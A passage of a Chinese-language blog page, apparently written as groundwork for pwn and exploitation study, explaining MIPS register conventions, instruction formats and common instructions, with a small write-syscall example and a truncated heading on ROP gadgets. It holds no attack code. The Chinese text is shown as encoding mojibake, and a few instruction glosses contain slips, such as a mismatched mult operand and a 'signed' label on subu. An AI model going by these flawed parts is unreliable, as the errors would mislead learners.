        <h2 id="3-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#3-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="3.å¯„å­˜å™¨å…³ç³»"></a>3.å¯„å­˜å™¨å…³ç³»</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">REGISTER</th>
<th align="left">NAME</th>
<th align="left">USAGE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">$zero</td>
<td align="left">å¸¸é‡0(constant value 0)</td>
</tr>
<tr>
<td align="left">$1</td>
<td align="left">$at</td>
<td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td align="left">$v0 - $v1</td>
<td align="left">å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation)</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td align="left">$a0-$a3</td>
<td align="left">å‡½æ•°è°ƒç”¨å‚æ•°(arguments)</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td align="left">$t0-$t7</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td align="left">$s0-$s7</td>
<td align="left">ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td align="left">$t8-$t9</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„),$t9é€šå¸¸ä¼šåœ¨å‡½æ•°è°ƒç”¨æ—¶ç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$28</td>
<td align="left">$gp</td>
<td align="left">å…¨å±€æŒ‡é’ˆ(Global Pointer),é€šå¸¸æœ‰å…¨å±€å˜é‡ã€å¸¸é‡ä¹‹ç±»ä¼šç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$29</td>
<td align="left">$sp</td>
<td align="left">å †æ ˆæŒ‡é’ˆ(Stack Pointer)</td>
</tr>
<tr>
<td align="left">$30</td>
<td align="left">$fp</td>
<td align="left">å¸§æŒ‡é’ˆ(Frame Pointer)</td>
</tr>
</tbody></table></div>
<p>è¯´æ˜</p>
<ul>
<li>$0</li>
</ul>
<p>å³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚</p>
<figure class="highlight mipsasm"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">t0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="comment">#å®é™…ä¸º  </span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>,$<span class="number">0</span>,$<span class="built_in">t1</span></span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚</p>
<ul>
<li>$1</li>
</ul>
<p>å³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ <code>lui</code>ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ<code>addi</code>ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› ä¹‹ä¸€ã€‚</p>
<ul>
<li>$2..$3:($v0-$v1)</li>
</ul>
<p>ç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚</p>
<ul>
<li>$4..$7:($a0-$a3)</li>
</ul>
<p>ç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚</p>
<ul>
<li>$8..$15:($t0-$t7)</li>
</ul>
<p>ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚</p>
<ul>
<li>$16..$23:($s0-$s7)</li>
</ul>
<p>ä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚</p>
<ul>
<li>$24..$25:($t8-$t9)</li>
</ul>
<p>åŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤<code>mfc0</code>(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ<code>jr</code>)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚<br>å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚</p>
<ul>
<li>$28:($gp)</li>
</ul>
<p>ä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚</p>
<ul>
<li>$29:($sp)</li>
</ul>
<p>MIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚</p>
<ul>
<li>$30:($fp)</li>
</ul>
<p>GNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚</p>
<ul>
<li>$31:($ra)</li>
</ul>
<p>å­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª<code>jal</code>(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å<code>jal X</code>è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨<code>jr $ra</code>è¿”å›ã€‚</p>

        <h2 id="4-æŒ‡ä»¤"   >
          <a href="#4-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æŒ‡ä»¤" class="headerlink" title="4.æŒ‡ä»¤"></a>4.æŒ‡ä»¤</h2>
      
        <h3 id="1-ä¸åŒç±»å‹çš„æŒ‡ä»¤"   >
          <a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="headerlink" title="(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤"></a>(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤</h3>
      
        <h4 id="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"   >
          <a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="headerlink" title="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"></a>Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>add</code>, <code>sub</code>, <code>and</code>, <code>or</code>, <code>nor</code>, <code>slt</code>, <code>sll</code>, <code>srl</code>, <code>jr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png" alt="image-20211230150231733"></p>
<ul>
<li>opcodï¼šæ“ä½œç  </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·</li>
<li>shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰</li>
<li>Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ </li>
</ul>
<p>Shamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚<code>stl</code>ï¼‰</p>

        <h4 id="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"   >
          <a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="headerlink" title="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"></a>Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>addi</code>, <code>lw</code>, <code>sw</code>, <code>lh</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code>, <code>ll</code>, <code>sc</code>, <code>lui</code>, <code>andi</code>, <code>ori</code>, <code>beq</code>, <code>bne</code>, <code>slti</code>, <code>sltiu</code></p>
<p><img   src="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0" style=""  alt="img"></p>
<ul>
<li>opcodï¼šæ“ä½œç </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡</li>
<li>rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡</li>
<li>imd: ç«‹å³å€¼</li>
</ul>

        <h4 id="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"   >
          <a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="headerlink" title="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"></a>Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€</h4>
      <p>å¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤</p>
<p>å¸¸è§æŒ‡ä»¤ï¼š<code>j</code>, <code>jal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png" alt="image-20211230150255746"></p>
<ul>
<li>Opcodï¼šæ“ä½œç </li>
<li>Imdï¼šç«‹å³å€¼</li>
</ul>

        <h3 id="2-å¸¸ç”¨æŒ‡ä»¤"   >
          <a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="(2)å¸¸ç”¨æŒ‡ä»¤"></a>(2)å¸¸ç”¨æŒ‡ä»¤</h3>
      <p>å…¶ä¸­<code>i</code>è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ<code>u</code>è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚</p>

        <h4 id="â‘ load-store-æŒ‡ä»¤"   >
          <a href="#â‘ load-store-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ load-store-æŒ‡ä»¤" class="headerlink" title="â‘ load/store æŒ‡ä»¤"></a>â‘ load/store æŒ‡ä»¤</h4>
      <ul>
<li><p>laï¼šå°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>la $t0,val_1</code>å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel</p>
</li>
<li><p>liï¼šå°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:<code>li $t1, 40</code> $t1 = 40</p>
</li>
<li><p>lwï¼šä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>lw $s0, 0($sp) $s0=MEM[$sp+0]</code></p>
</li>
<li><p>swï¼šå°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:<code>sw $a0, 0($sp) MEM[$sp+0] = $a0</code></p>
</li>
<li><p>moveï¼šå¯„å­˜å™¨ä¼ å€¼ egï¼š<code>move $t5, $t2 $t5 = $t2</code></p>
</li>
</ul>

        <h4 id="â‘¡ç®—æ•°æŒ‡ä»¤"   >
          <a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="headerlink" title="â‘¡ç®—æ•°æŒ‡ä»¤"></a>â‘¡ç®—æ•°æŒ‡ä»¤</h4>
      <p>ç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2;		$t0=$t1+$t2;	å¸¦ç¬¦å·æ•°ç›¸åŠ </span><br><span class="line">sub $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">addi $t0, $t1, 5;		$t0=$t1+5;		æœ‰ç«‹å³æ•°çš„åŠ æ³•</span><br><span class="line">addu $t0, $t1, $t2;		$t0=$t1+$t2;	æ— ç¬¦å·æ•°çš„åŠ æ³•</span><br><span class="line">subu $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">mult $t3, $t3;			(HI, LO) = $t3 * $t4</span><br><span class="line">div $t5, $t6;			$Hi=$t5 mod $t6</span><br><span class="line">mfhi $t0;				$t0 = $Hi</span><br><span class="line">mflo $t1;				$t1 = $Lo</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢syscall"   >
          <a href="#â‘¢syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢syscall" class="headerlink" title="â‘¢syscall"></a>â‘¢syscall</h4>
      <p>äº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›</p>
<p>è¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶</p>
<p>Write(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addiu $sp, $sp, -32;</span><br><span class="line">li $a0, 1;</span><br><span class="line">lui $t6, 0x4142;</span><br><span class="line">ori $t6, $t6, 0x430a;</span><br><span class="line">sw  $t6, $0($sp);</span><br><span class="line">addiu $a1, $sp, 0;</span><br><span class="line">li $a2, 5;</span><br><span class="line">li $v0, 4004;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"></a>â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤</h4>
      <p>åˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b target;				æ— æ¡ä»¶è·³è½¬åˆ°targetå¤„</span><br><span class="line">beq $t0, $t1, target;	å¦‚æœ&quot;$t0 == $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">blt $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt; $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">ble $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt;= $t1â€ è·³è½¬åˆ°target</span><br><span class="line">bgt;</span><br><span class="line">blt;</span><br><span class="line">bne;					ç±»æ¯”ä¸Š</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘¤è·³è½¬æŒ‡ä»¤"></a>â‘¤è·³è½¬æŒ‡ä»¤</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j target;			æ— æ¡ä»¶è·³è½¬target</span><br><span class="line">jr $t3;				è·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register),æ²¡æœ‰ä¿å­˜åœ°å€,ä¸€èˆ¬æ˜¯å‡½æ•°è¿”å›æ—¶å€™ç”¨åˆ°çš„</span><br><span class="line">jal target;			è·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­ï¼Œå¸¸è§äºå‡½æ•°è°ƒç”¨</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¥å­å‡½æ•°çš„è°ƒç”¨"   >
          <a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="â‘¥å­å‡½æ•°çš„è°ƒç”¨"></a>â‘¥å­å‡½æ•°çš„è°ƒç”¨</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal   sub_routine_label;å¤åˆ¶è¿”å›åœ°å€åˆ°$raä¸­,å³å½“å‰PC+8çš„å€¼ï¼Œç¨‹åºè·³è½¬åˆ°sub_routine_label</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¦å­å‡½æ•°çš„è¿”å›"   >
          <a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="headerlink" title="â‘¦å­å‡½æ•°çš„è¿”å›"></a>â‘¦å­å‡½æ•°çš„è¿”å›</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€</span><br></pre></td></tr></table></div></figure>



<p>ä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://valeeraz.github.io/2020/05/08/architecture-mips/" >MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvainâ€™s Blog (valeeraz.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259594" >2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-å¸¸ç”¨ROPå¯»å€"   >
          <a href="#5-å¸¸ç”¨ROPå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¸¸ç”¨ROPå¯»å€" class="headerlink" title="5.å¸¸ç”¨ROPå¯»å€"></a>5.å¸¸ç”¨ROPå¯»å€</h2>
      <p>IDAä¸­</p>
